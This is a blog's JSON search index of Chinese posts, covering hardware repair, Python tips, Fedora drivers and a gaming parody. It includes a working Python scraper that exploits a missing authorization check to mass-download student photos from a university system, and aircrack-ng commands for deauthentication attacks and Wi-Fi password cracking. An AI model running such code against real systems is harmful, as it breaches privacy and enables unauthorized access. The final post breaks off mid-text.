{"pages":[{"title":"About","text":"","link":"/hexo-blog/about.html"},{"title":"Contact","text":"","link":"/hexo-blog/contact.html"},{"title":"All categories","text":"","link":"/hexo-blog/categories/index.html"},{"title":"All tags","text":"","link":"/hexo-blog/tags/index.html"}],"posts":[{"title":"Gateway ID47H07C 笔记本拆机加内存，图文重播","text":"半个月前新买的笔记本，因内存只有2G，在64bit Windows7下的用户体验不是很好，琢磨了很久，便最终决定亲自为爱机加内存。 今天从某东商城邮购的内存刚到手，便第一时间准备好拆机工具。 拆机准备：螺丝刀一套（十字，一字），内存一条（金士顿 DDR3 1333 4GB），拆机专用刀，小刀（备用）。 拆机前进一下系统，说不定拆坏了就进不去了。 Gateway ID 系列的设计很疼，必须先拆线 C 面键盘（键盘是最难拆的部件，一定要小心，很容易在键盘上留下痕迹。不能使蛮力，否则就要换键盘了。） 拆下键盘后，拧下键盘下的4个螺丝，其中左上部有一螺丝被排线遮挡，很难发现，小心地拧下。 C面拆完，拆D面，一共有六个螺丝。小心地拧下后，用拆机刀别开后盖（此处更需要细心和耐心）。 打开后盖后，笔记本的内脏一览无余。右下角就是内存的位置，因为该本的原2G内存是直接焊到主板上的，所以只能再加一个4G的，即最大6G。 内存特写，准备就位。 将内存槽左右的卡子掰开，将内存推入。 内存安装完毕。 接下来一步一步将零件组装上，装后盖时要一边一边装，让每一个卡子到位。然后把螺丝拧上，这个步骤也一定要小心，不要装完了发现多了一个螺丝。 忐忑地开机，成功一次点亮！ 速度明显快了一些。 内存占用图： Windows 评分 5.4。 360卫视硬件检测。 加内存前360卫视评分。 加内存后360卫视评分。 小结：以前从没有这么大规模地拆过笔记本，经过这次的尝试，确实增长了很多经验值，也为以后更换SSD奠定了基础。总之，技术宅就是要不怕折腾。有问题可以发邮件哦，whypro(at)live.cn。 By whypro Sat, Feb 25, 2012 15:36","link":"/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/"},{"title":"【边缘检测 v0.7beta】——献给我的大学","text":"边缘检测 v0.7beta 作者：whypro 下载地址：https://sourceforge.net/projects/edgedetection/ 软件功能：利用Canny、Sobel、Laplace算子以及蚁群算法对图像边缘进行检测、识别和提取。 献给我的大学。 By whypro May 30, 2012","link":"/hexo-blog/20120831/【边缘检测 v0.7beta】——献给我的大学/"},{"title":"【正方教务管理系统】HACK日志（一）","text":"使用 Wireshark 抓包后得到校正方系统的登陆过程如下： 头信息： 请求头 值 (Request-Line) POST /default2.aspx HTTP/1.1 Host jwc.**.edu.cn:8989 Connection keep-alive Content-Length 156 Cache-Control max-age=0 Origin http://jwc.****.edu.cn:8989 User-Agent Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5 Content-Type application/x-www-form-urlencoded Accept text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Referer http://jwc.****.edu.cn:8989/ Accept-Encoding gzip,deflate,sdch Accept-Language zh-CN,zh;q=0.8 Accept-Charset GBK,utf-8;q=0.7,*;q=0.3 Cookie ASP.NET_SessionId=mrctyyikxevfky55cerpjx45 发送的数据： 参数名 值 __VIEWSTATE dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+ TextBox1 ********** TextBox2 ********** RadioButtonList1 学生 Button1 lbLanguage 查询过程如下： 头信息： 请求头 值 (Request-Line) GET /readimagexs.aspx?xh=** HTTP/1.1 Host jwc.**.edu.cn:8989 Connection keep-alive User-Agent Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5 Accept text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Encoding gzip,deflate,sdch Accept-Language zh-CN,zh;q=0.8 Accept-Charset GBK,utf-8;q=0.7,*;q=0.3 Cookie ASP.NET_SessionId=mrctyyikxevfky55cerpjx45 查询字符串 参数名 值 xh ********** 整个登陆过程已经很明朗了，明天将用Python实现。 2012-06-30By whypro","link":"/hexo-blog/20120630/【正方教务管理系统】HACK日志（一）/"},{"title":"【正方教务管理系统】HACK日志（二）","text":"正方系统的一个漏洞是获取学生图片时没有对学生身份进行检测。理论上来说，获取学生李四的照片，需要首先判断登陆者身份是教师或者学生，如果是学生还要判断登陆者是否为李四本人，而正方系统在这一方面并没有做得很好，导致张三可以轻松地获取李四的照片。 下面是笔者编写的一个简单的爬虫程序，Python 代码如下（Python 3.2）， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import http.clientimport urllibimport os_xh = '**********'_pw = '**********'VIEWSTATE = 'dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+'host = 'jwc.****.edu.cn:8989'main_url = 'http://' + hostlogin_page = '/default2.aspx'login_url = main_url + login_pagereadimage_page = '/readimagexs.aspx'print(main_url)print(login_url)conn = http.client.HTTPConnection(host)login_post_data = urllib.parse.urlencode({ '__VIEWSTATE': VIEWSTATE, 'TextBox1': _xh, 'TextBox2': _pw, 'RadioButtonList1': '学生', 'Button1': '', 'lbLanguage': ''})login_post_data = login_post_data.encode('utf-8')login_headers = { 'Host': host, 'Connection': 'keep-alive', 'Origin': main_url, 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': main_url, 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3'}conn.request('POST', login_page, body = login_post_data, headers = login_headers)result = conn.getresponse()print(result.status)#print(result.read())cookie = result.msg['set-cookie'].split(';')[0]#print(cookie)conn.close()readimage_headers = { 'Host': host, 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3', 'Cookie': cookie}conn.request('GET', '/xs_main.aspx' + '?' + 'xh=' + _xh, headers = readimage_headers)#result = conn.getresponse()#print(result.status)#print(result.read())conn.close()for year in range(1, 12):#11 for college in range(1, 20):#19 for major in range(1, 15):#14 for mclass in range(1, 10): for series in range(1, 50): image_xh = \"%02d%02d%02d%02d%02d\" % (year, college, major, mclass, series) readimage_url = readimage_page + '?' + 'xh=' + image_xh print(readimage_url) conn.request('GET', readimage_url, headers = readimage_headers) result = conn.getresponse() #print(result.status) image = result.read() if len(image) &gt; 1024: save_path = os.path.join(os.path.abspath('./pic/'), image_xh + '.bmp') print(save_path) fp = open(save_path, 'wb') fp.write(image) fp.close() else: print('skip')print('done')conn.close() 后记：正方的选课模块依然有这样的漏洞，因此理论上来说，偷窥别人的课程、暴力选课也照样可以实现。 2012-07-01By whypro","link":"/hexo-blog/20120701/【正方教务管理系统】HACK日志（二）/"},{"title":"Fedora 17 安装无线网卡驱动","text":"1. 首先添加 RPM Fusion 源 一般情况下，Fedora 17 自带的软件源并不能满足我们的需求，有时在官方软件源搜索不到的软件，在 RPM Fusion 上往往可以搜索到（尤其是第三方软件与驱动）。因此，我们首先将 RPM Fusion 源添加到系统上： 参见：http://rpmfusion.org/Configuration，我们在终端中输入（针对于 Fedora 17）： 1su -c &apos;yum localinstall --nogpgcheck http://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-stable.noarch.rpm http://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-stable.noarch.rpm&apos; 2. 安装 kmod-wl 软件包 添加了上面的软件源，我们就可以运行下面命令搜索第三方驱动包： 1yum search kmod-wl 接下来会显示一大坨 kmod-wl，分别对应不同的 Kernel 版本。 要知道本机的 Kernel 版本，运行： 1uname -r 在 serach 返回的结果中找到与之对应的 kmod-wl 版本，运行： 1sudo yum install kmod-wl-{对应版本号} 重启计算机 注意： 1. 机器需要能上网（有线） 2. 需要管理员权限，如果用户不再管理员组需要先将其加入管理员组；或者使用 su 命令切换到 root 账户再操作。 3. kmod-wl 驱动包并不能保证支持所有的网卡型号，所以最重要的一点是要看人品，关于如何增加人品，请访问【这里】。","link":"/hexo-blog/20120930/Fedora-17-安装无线网卡驱动/"},{"title":"找出字符串中第一个只出现一次的字符","text":"昨天参加了一次笔试，最后一道题是这样的：找出一个纯字母字符串中第一个只出现一次的字符。 我的思路是这样的，假设该字符串是由纯小写字母组成，则可以定义一个布尔数组，该数组保存每个字符出现次数是否大于 1 的状态。接着遍历字符串，同时利用 ASCII 码对应到布尔数组，判断状态即可。鄙人的 C++ 代码如下： 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;cassert&gt;using namespace std;char FirstAppearOnce(char* str) { bool moreThanOnce[26] = {false}; for (char* p = str; *p != '\\0'; ++p) { assert((*p &gt;= 'a') &amp;&amp; (*p &lt;= 'z')); char* q; for (q = p + 1; !moreThanOnce[*p - 'a'] &amp;&amp; (*q != '\\0'); ++q) { if (*q == *p) { moreThanOnce[*p - 'a'] = true; break; } } if (*q == '\\0') { return *p; } } return 0;}int main() { char* str = \"thisisateststring\"; cout &lt;&lt; FirstAppearOnce(str) &lt;&lt; endl; system(\"pause\"); return 0;} 如果存在大小 写、符号等情况，则可以为 整个 ASCII 字符创建一个布尔数组（ASCII 有 128 个字符，因此数组可改为 128 个元素 ） 。对上面代码稍稍修改一下，便可以支持所有字符： 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;char FirstAppearOnce(char* str) { bool moreThanOnce[128] = {false}; for (char* p = str; *p != '\\0'; ++p) { char* q; for (q = p + 1; !moreThanOnce[*p] &amp;&amp; (*q != '\\0'); ++q) { if (*q == *p) { moreThanOnce[*p] = true; break; } } if (*q == '\\0') { return *p; } } return 0;}int main() { char* str = \"This is a test string.\"; cout &lt;&lt; FirstAppearOnce(str) &lt;&lt; endl; system(\"pause\"); return 0;} 欢迎拍砖。","link":"/hexo-blog/20121019/找出字符串中第一个只出现一次的字符/"},{"title":"aircrack-ng 使用笔记","text":"1. airmon-ng：激活网卡监听 1airmon-ng start wlan0 2. airodump-ng：捕获802.11数据报文，以便于破解 无参数启动 airodump-ng 可查看所有接收范围内的AP、Client信息 1airodump-ng \\[-w filename\\] \\[-c channel\\] mon0 其中，-w 后的参数为保存的文件名，-c 后的参数为频段 3. aireplay-ng：根据需要创建特殊的无线网络数据报文 aireplay-ng -9：注入攻击链路质量测试 WEP: aireplay-ng -1：伪认证联机请求攻击 伪认证联机请求并发送保持在线数据 1aireplay-ng -1 6000 -o 1 -q 10 -e (bssid) -a (AP Mac) -h (Host Mac) mon0 aireplay-ng -3：ARP 攻击 监听 ARP 报文，一旦出现就不断将该报文重发，使目标机器产生实际回应数据，发回更多IV数据。 对于无机器连接的 WEP： aireplay-ng -5：Fragmenation 攻击 监听一个 AP 广播出来的数据包，并抽离有效的伪随机数据(PRGA)，保存到 fragment-XXXX-XXXXX.xor 文件供下一步使用。 有时监听到的不是广播包，转发攻击后 AP 没有回应，一系列重试后程序会重新监听；有时候可能需要不少时间，加 –F 参数可以自动应答。 aireplay-ng -4：chopchop 攻击 上述攻击不奏效可试，相同作用。 WPA/WPA2: aireplay-ng -0：Deauthentication 攻击 往已经连接到 AP 的一个客户端伪造一个离线包，使其离线重连以便捕捉 handshake。注意要收到 ACK，才表明被攻击客户端收到，才会下线；发送离线不宜过密过多。 4. aircrack-ng：暴力破解 1aircrack-ng \\[-w dictionary\\] *.cap 暴力破解。其中，-w 参数为密码字典，破解的成功率取决于字典的覆盖程度以及机器的速度。","link":"/hexo-blog/20121011/aircrack-ng-使用笔记/"},{"title":"我是火枪，我想打 DPS","text":"我把简历递给考官时，感到自己的白胡子因为紧张而微微发抖。跟其他毕业生一样，我需要一份工作。 “矮人狙击手。通过使用熟练的射击技术和我信赖的火枪，我能对远处的敌人实施系统的破坏。通过对最容易遭受攻击的区域的细致瞄准，我能够对敌人造成严重的伤害，只需要一 小段时间，我就可以用人们所熟知的那种方法（狙击）来除掉一个对手。我的火枪配有第2弹管，可以用来发射榴散弹，在近处的区域造成大量伤害。”面试官慢慢读着简历上我的自我简介，道，“这么说来，你是来应聘DPS的？”我点头。“你的特长是什么？”考官问。“我是远程，我是敏捷英雄，我是远程。我是后期。我够猥琐。”“猥琐？”考官不解，”这是优点？”“就是前期很会提防gank。”我解释道。“这样啊。你有留人技能吗。”“我的爆头可以打断别人TP。45%概率0.01秒晕眩。”我说。“像我们公司的虚空假面和鱼人守卫可以晕住别人1到2秒。你这个有点不够达标。”考官说。“如果公司需要，我可以出碎骨锤。”我说。“你有保命技能吗。”“保住性命的最好办法就是在别人杀你之前你依靠意识和走位还有操作反杀之。”我说。“我问你有保命技能吗。有还是没有？”“呃，没有。”“我们公司的dps一般都要求有逃生技能。譬如虚空假面和敌法师的闪烁，骷髅王的重生什么的。”“如果公司需要，我可以出洛萨之锋。”我说。“你团战作用怎么样。”考官问。“我的弹幕可以减速，顺带dot伤害。”我说。“不能群晕么。”考官说。“应该不能吧。”“你的弹幕有给团队带来的增益吗？”“呃。没有。”“我们公司暗牧的大招团战时候可以给我们加护甲，给对面减甲。”“如果公司需要，我可以出梅肯。”我摸摸额头上的汗。“你够肉吗。”“呃，我的职责更应该是全力输出。”“站不住的DPS连尸体都不如，你听说过这句话吗，年轻人？”“如果公司需要，我可以出先锋盾和跳刀，团战第一时间切入，吸收伤害和技能。”我说。“嗯。你的薪酬要求是多少？”“20分钟前可以有出假腿的钱。”我不敢多说。“工作待遇要求呢？”“我只要野区的狗头人一家作为最低保障。”“年轻人，”考官这时说道，“我们考察了一下，你是一名有志于做dps的人。但是你的祖籍是近卫，怎么会想到来我们天灾集团求职呢.”“我爸妈手速慢，生我的时候没有抢到近卫5楼。所以我的户口算是天灾的。”我说。“你要知道，我们公司是本地生源优先的哦。”考官说。“我懂。但我可以待遇比本地户口的天灾人员低一些。只要贵公司给我打dps的机会。”我说。“我们会好好考虑的。你可以回去了，等我们的通知。” 离开冰封王座的时候，我还是不由打了个冷战。我急需这份工作。但我的竞争者很强。即便我幸运地被录用了，也得比别人做更高强度的工作。我要打钱快，前期压人，中期gank，后期超神。我要在团战的时候吸收伤害，然后先手控制住对面的C，秒掉法师，收割dps。我还要用梅肯给队友加血，包鸡包眼包雾，让野，拆眼。等等，这还是原来的我么？上大学的时候，系主任说后期dps系是最吃香的，是天之骄子。四年以后，6.5x变成了6.7x，形势大变，环境已经不容许我们后期闲云野鹤了。像我这种没有什么保命或者控制技能的dps，找工作是最难的。 我真羡慕那个高帅富的骷髅王，有锤子，有吸血，带暴击，还有两条命。周末的时候他和冰女去开f了。而我只有对着冰女的照片摸摸撸着。我也羡慕那个飘逸的影魔和蓝猫，国际企业展览会上总有他们的身影。我甚至羡慕VS，这小黑妹学的家政管理，包鸡包眼还要gank和换人，累是累了，但是好歹有份工作，混口饭吃。对了，冰女学的也是这个专业，因为有个回魔光环，俨然成了援gj一颗新星了。 想着想着，我不由叹了一口气，掏出最后一根艾西菲的远古祭祀，点着了一棵树，默默抽着。我可不像影魔他们，可以经常喝100大元一瓶的药膏。我看到不远处，同班的小黑在低声啜泣。看来是面试遭拒了吧。她虽说射手天赋好，还有冰箭减速，可惜一个姑娘家身板太脆，再加上出身黑暗，尽管是正宗近卫户口，也难以找到工作。唉。同是天涯沦落人呐。我走过去想安慰她。她抬头看我，道，你谁呀，矮矬穷？我是火枪，我想打dps。","link":"/hexo-blog/20121016/我是火枪，我想打-DPS/"},{"title":"BeautifulSoup3 编码问题总结","text":"关于 BeautifulSoup3 对 gb2312 编码的网页解析的乱码问题，【这篇文章】提出了一个勉强能用的解决方法。即如果中文页面编码是 gb2312，gbk，在 BeautifulSoup 构造器中传入 fromEncoding=&quot;gb18030&quot; 参数即可解决乱码问题，即使分析的页面是 utf8 的页面使用 gb18030 也不会出现乱码问题！如： 1234567from urllib2 import urlopenfrom BeautifulSoup import BeautifulSouppage = urllib2.urlopen('http://www.baidu.com');soup = BeautifulSoup(page,fromEncoding=\"gb18030\")print soup.originalEncoding 为什么网页是 utf8 传入 gb18030 依然能够正常解析呢？ 这是由于，BeautifulSoup 的编码检测顺序为： 创建 Soup 对象时传递的 fromEncoding 参数； XML/HTML 文件自己定义的编码； 文件开始几个字节所表示的编码特征，此时能判断的编码只可能是以下编码之一：UTF-#，EBCDIC 和 ASCII； 如果你安装了 chardet，BeautifulSoup 就会用 chardet 检测文件编码； UTF-8； Windows-1252。 因此，当传入 fromEncoding=&quot;gb18030&quot; 编码参数与 html 文件编码不匹配时，BeautifulSoup 并不会抛出异常，而是按照预定义的编码检测顺序，按照 utf8 来解析，因此也可以勉强得到正确结果！","link":"/hexo-blog/20130328/BeautifulSoup3-编码问题总结/"},{"title":"Chrome 浏览器强制使用 https 传输","text":"在日常工作和生活中，一些网站的访问很容易受到“不可抗拒因素”的影响，这大多都是因为 http 请求是明文传输，这样很容易受到某些防火墙的干扰，比如“101 CONNECT_RESET”。而 Chrome 强制使用 https 协议访问这些站点一般来说可以解决此问题，设置方法如下： 在 Chrome 地址栏输入 chrome://net-internals/#hsts ，如图，在 Domain（域名）中输入地址，如 google.com 或 facebook.com，选中 Include subdomains（包含子域名），点击 Add（添加）。 再访问这些站点，就会发现强制使用 https 了。","link":"/hexo-blog/20130329/Chrome-浏览器强制使用-https-传输/"},{"title":"Python执行系统命令的方法","text":"(1) os.system# 仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息 system(command) -&gt; exit_statusExecute the command (a string) in a subshell. # 如果再命令行下执行，结果直接打印出来 1234&gt;&gt;&gt; os.system(&apos;ls&apos;)04101419778.CHM bash document media py-django video11.wmv books downloads Pictures pythonall-20061022 Desktop Examples project tools (2) os.popen# 该方法不但执行命令还返回执行后的信息对象 popen(command [, mode=’r’ [, bufsize]]) -&gt; pipeOpen a pipe to/from a command returning a file object. 例如： 1234567891011121314151617&gt;&gt;&gt; tmp = os.popen(&apos;ls *.py&apos;).readlines()&gt;&gt;&gt; tmpOut[21]:[&apos;dump_db_pickle.py &apos;,&apos;dump_db_pickle_recs.py &apos;,&apos;dump_db_shelve.py &apos;,&apos;initdata.py &apos;,&apos;__init__.py &apos;,&apos;make_db_pickle.py &apos;,&apos;make_db_pickle_recs.py &apos;,&apos;make_db_shelve.py &apos;,&apos;peopleinteract_query.py &apos;,&apos;reader.py &apos;,&apos;testargv.py &apos;,&apos;teststreams.py &apos;,&apos;update_db_pickle.py &apos;,&apos;writer.py &apos;] 好处在于：将返回的结果赋于一变量，便于程序的处理。 (3) 使用模块 subprocess12&gt;&gt;&gt; import subprocess&gt;&gt;&gt; subprocess.call([&quot;cmd&quot;, &quot;arg1&quot;, &quot;arg2&quot;],shell=True) 获取返回和输出: 12345import subprocessp = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)for line in p.stdout.readlines(): print line,retval = p.wait() (4) 使用模块 commands12345678&gt;&gt;&gt; import commands&gt;&gt;&gt; dir(commands)[&apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__name__&apos;, &apos;getoutput&apos;, &apos;getstatus&apos;,&apos;getstatusoutput&apos;, &apos;mk2arg&apos;, &apos;mkarg&apos;]&gt;&gt;&gt; commands.getoutput(&quot;date&quot;)&apos;Wed Jun 10 19:39:57 CST 2009&apos;&gt;&gt;&gt;&gt;&gt;&gt; commands.getstatusoutput(&quot;date&quot;)(0, &apos;Wed Jun 10 19:40:41 CST 2009&apos;) 注意： 当执行命令的参数或者返回中包含了中文文字，那么建议使用subprocess，如果使用os.popen则会出现下面的错误: 1234567Traceback (most recent call last): File &quot;./test1.py&quot;, line 56, inmain() File &quot;./test1.py&quot;, line 45, in main fax.sendFax() File &quot;./mailfax/Fax.py&quot;, line 13, in sendFax os.popen(cmd)UnicodeEncodeError: &apos;ascii&apos; codec can&apos;t encode characters in position 46-52: ordinal not inrange(128)","link":"/hexo-blog/20130413/Python执行系统命令的方法/"},{"title":"Python 中用 Ctrl+C 终止多线程程序的问题解决","text":"花了一天时间用python为服务写了个压力测试。很简单，多线程向服务器发请求。但写完之后发现如果中途想停下来，按Ctrl+C达不到效果，自然想到要用信号处理函数捕捉信号，使线程都停下来，问题解决的方法请往下看： 12345678910111213141516171819202122232425262728293031#!/bin/env python# -*- coding: utf-8 -*-#filename: peartest.pyimport threading, signalis_exit = Falsedef doStress(i, cc): global is_exit idx = i while not is_exit: if (idx &lt; 10000000): print \"thread[%d]: idx=%d\"%(i, idx) idx = idx + cc else: break print \"thread[%d] complete.\"%idef handler(signum, frame): global is_exit is_exit = True print \"receive a signal %d, is_exit = %d\"%(signum, is_exit)if __name__ == \"__main__\": signal.signal(signal.SIGINT, handler) signal.signal(signal.SIGTERM, handler) cc = 5 for i in range(cc): t = threading.Thread(target=doStress, args=(i,cc)) t.start() 上面是一个模拟程序，并不真正向服务发送请求，而代之以在一千万以内，每个线程每隔并发数个（cc个）打印一个整数。很明显，当所有线程都完成自己的任务后，进程会正常退出。但如果我们中途想退出（试想一个压力测试程序，在中途已经发现了问题，需要停止测试），该肿么办？你当然可以用ps查找到进程号，然后kill -9杀掉，但这样太繁琐了，捕捉Ctrl+C是最自然的想法。上面示例程序中已经捕捉了这个信号，并修改全局变量is_exit，线程中会检测这个变量，及时退出。 但事实上这个程序并不work，当你按下Ctrl+C时，程序照常运行，并无任何响应。网上搜了一些资料，明白是python的子线程如果不是daemon的话，主线程是不能响应任何中断的。但设为daemon后主线程会随之退出，接着整个进程很快就退出了，所以还需要在主线程中检测各个子线程的状态，直到所有子线程退出后自己才退出，因此上例29行之后的代码可以修改为： 12345678threads=[]for i in range(cc): t = threading.Thread(target=doStress, args=(i, cc)) t.setDaemon(True) threads.append(t) t.start()for i in range(cc): threads[i].join() 重新试一下，问题依然没有解决，进程还是没有响应Ctrl+C，这是因为join()函数同样会waiting在一个锁上，使主线程无法捕获信号。因此继续修改，调用线程的isAlive()函数判断线程是否完成： 123456while 1: alive = False for i in range(cc): alive = alive or threads[i].isAlive() if not alive: break 这样修改后，程序完全按照预想运行了：可以顺利的打印每个线程应该打印的所有数字，也可以中途用Ctrl+C终结整个进程。完整的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/env python# -*- coding: utf-8 -*-#filename: peartest.pyimport threading, signalis_exit = Falsedef doStress(i, cc): global is_exit idx = i while not is_exit: if (idx &lt; 10000000): print \"thread[%d]: idx=%d\"%(i, idx) idx = idx + cc else: break if is_exit: print \"receive a signal to exit, thread[%d] stop.\"%i else: print \"thread[%d] complete.\"%idef handler(signum, frame): global is_exit is_exit = True print \"receive a signal %d, is_exit = %d\"%(signum, is_exit)if __name__ == \"__main__\": signal.signal(signal.SIGINT, handler) signal.signal(signal.SIGTERM, handler) cc = 5 threads = [] for i in range(cc): t = threading.Thread(target=doStress, args=(i,cc)) t.setDaemon(True) threads.append(t) t.start() while 1: alive = False for i in range(cc): alive = alive or threads[i].isAlive() if not alive: break 其实，如果用python写一个服务，也需要这样，因为负责服务的那个线程是永远在那里接收请求的，不会退出，而如果你想用Ctrl+C杀死整个服务，跟上面的压力测试程序是一个道理。 总结一下，python多线程中要响应Ctrl+C的信号以杀死整个进程，需要： 把所有子线程设为Daemon； 使用isAlive()函数判断所有子线程是否完成，而不是在主线程中用join()函数等待完成； 写一个响应Ctrl+C信号的函数，修改全局变量，使得各子线程能够检测到，并正常退出。","link":"/hexo-blog/20130424/Python-中用-Ctrl-C-终止多线程程序的问题解决/"},{"title":"Python 实现 socket 通讯 (TCP/UDP) ","text":"1. TCP1.1 TCP-Server12345678910111213141516171819202122232425262728293031323334353637# -*- coding: utf-8 -*-# TCP-Serverimport socket# 1. 创建 socket 对象s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 2. 将 socket 绑定到指定地址address = ('127.0.0.1', 10140) s.bind(address)# 3. 接收连接请求s.listen(5)# 4. 等待客户请求一个连接# 调用 accept 方法时，socket 会进入 \"waiting\" 状态。# accept方法返回一个含有两个元素的元组 (connection, address)。# 第一个元素 connection 是新的 socket 对象，服务器必须通过它与客户通信；# 第二个元素 address 是客户的 Internet 地址。ss, addr = s.accept()print 'got connect from', addr# 5. 处理：服务器和客户端通过 send 和 recv 方法通信# send 方法返回已发送的字节个数。# 调用 recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。# recv方法在接收数据时会进入 \"blocked\" 状态，最后返回一个字符 串，用它表示收到的数据。# 如果发送的数据量超过了recv 所允许的，数据会被截短。# 多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区删除。while True: ra = ss.recv(512) print 'client:', ra ss.send('received')# 6. 传输结束，关闭连接ss.close()s.close() 2.2 TCP-Client123456789101112131415161718# -*- coding: utf-8 -*-# TCP-Clientimport socketaddress = ('127.0.0.1', 10140)s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(address)while True: message = raw_input() if not message: break s.send(message) data = s.recv(512) print 'server:', datas.close() 2. UDP2.1 UDP-Server1234567891011121314# -*- coding: utf-8 -*-# UDP-Serverimport socketaddress = ('127.0.0.1', 10141)s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)s.bind(address)while True: data, addr = s.recvfrom(2048) print \"received:\", data, \"from\", addrs.close() 2.2 UDP-Client123456789101112131415# -*- coding: utf-8 -*-# UDP-Clientimport socket address = ('127.0.0.1', 10141) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) while True: message = raw_input() if not message: break s.sendto(message, address) s.close()","link":"/hexo-blog/20130828/Python-实现-socket-通讯-TCP-UDP/"},{"title":"主板维修——更换爆浆电容","text":"家里的电脑买了七、八年了，最近显示器突然出现了偶尔无法正常工作，桌面黑屏，画面无法刷新的情况。 首先怀疑是显卡问题，但是该主板没有独立显卡，是集成显卡，所以问题也就转移到了主板了。 仔细观察了一下主板上的电容，发现果然有一个爆浆了，如图。记下规格：6.3V 1500μF。 下面是具体维修步骤： 1. 从机箱上卸下主板，卸下风扇，将灰尘清理干净 2. 焊下爆浆的电容 用烙铁拆卸电容是一定要注意，因为主板制造工艺与一般家电不同，大部分烙铁无法轻松地将其焊下来，所以最好使用加焊法，即同时给两个焊点加焊至熔化，然后轻轻取下。 然后从旧主板上拆下两个同型号的电容，当然也可以从电子城买到。 左边是爆浆的电容，右边是好电容 3. 焊上好的电容 焊接前最好用大头针将主板孔清理干净，然后将电容轻轻插入，注意正负极。加松香、焊锡焊接。 焊好后用酒精擦除掉残留的松香。 4. 最终效果图 5. 成功点亮，问题解决","link":"/hexo-blog/20150421/主板维修——更换爆浆电容/"},{"title":"Python 引用，拷贝，对象回收，弱引用","text":"引用python中，在对对象赋值，参数传递，函数返回等等, 都是引用传递的. 直接copy个例子来【1】： 1234a = [1, 2, 3]b = ab.append(5)print a, b 输出结果为： 1[1, 2, 3, 5] [1, 2, 3, 5] 面的结果有助于理解引用的实际情况。 具体查看一个对象的引用数，可以使用sys.getrefcount(ojb)获取，但这个函数有点邪恶，有时似乎并不给出正确的结果，正常来说获取的值都比你想要的大，一般是大1，因为给这个函数传参数也算一个引用。但有时会大得离谱，来例子： 123import sysa = \"a\"sys.getrefcount(a) 在我的机器上，输出结果尽然为14，网络遛了一圈，有人说是python内部对“a”这个对象进行了引用。好吧！就这样理解把，有高见的可以留言告我一下！ 拷贝【1】拷贝主要有两种拷贝，分别以copy模块中的两个函数copy和deepcopy为代表。其中，前者复制对象本身，但对于对象中得元素，还是会使用的原本引用，copy个例子来： 1234list_of_lists = [ ['a'], [1, 2], ['z', 23] ]copy_lol = copy.copy(lists_of_lists)copy_lol[1].append('boo')print list_of_lists, copy_lol 输出结果为： 1[[&apos;a&apos;], [1, 2, &apos;boo&apos;], [&apos;z&apos;, 23]] [[&apos;a&apos;], [1, 2, &apos;boo&apos;], [&apos;z&apos;, 23]] 考到第二个元素的情况了 把！用的还是引用。要想全部对对象本省进行拷贝，就得使用deepcopy了。 对象回收Python使用了垃圾回收器来自动销毁那些不再使用的对象。当对某个对象的引用计数为0时， Python能够安全地销毁这个对象。表面上看来，在使用C或者C++时经常会碰到的内存泄露问题似乎也就解决了，但实际的情况是，请你小心！再copy个例子来【2】： 12345678910111213class LeakTest(object): def __init__(self): print 'Object with id %d born here.' % id(self) def __del__(self): print 'Object with id %d dead here.' % id(self)def foo(): A = LeakTest() B = LeakTest() A.b = B B.a = Aif __name__ = =\"__main__\": foo() 运行结果为： 12Object with id 10462448 born here.Object with id 10462832 born here. 在构造一个类时，__init__会被自动调用；在进行对象回收时，__del__会被调用。很清楚的看到对象只是被创建了，而没有被回收，原因很简单，A和B的由于互相引用，他们的引用次数是不可能为0的，自然被回收也是不可能的了。这是，就应该考虑弱引用了。 弱引用这是相对上面“引用”的一个概念，主要不同体现在对象回收时，上面我只提到当引用数为0，对象就会自动回收。其实还有另外一种情况，当自由只有对对象的弱引用时，对象也是会被回收。直接上代码，对上例做出一些修改： 1234567891011121314import weakrefclass LeakTest(object): def __init__(self): print 'Object with id %d born here.' % id(self) def __del__(self): print 'Object with id %d dead here.' % id(self)def foo(): A = LeakTest() B = LeakTest() A.b = weakref.proxy(B) B.a = weakref.proxy(A)if __name__ = =\"__main__\": foo() 运行结果为： 1234Object with id 28637456 born here.Object with id 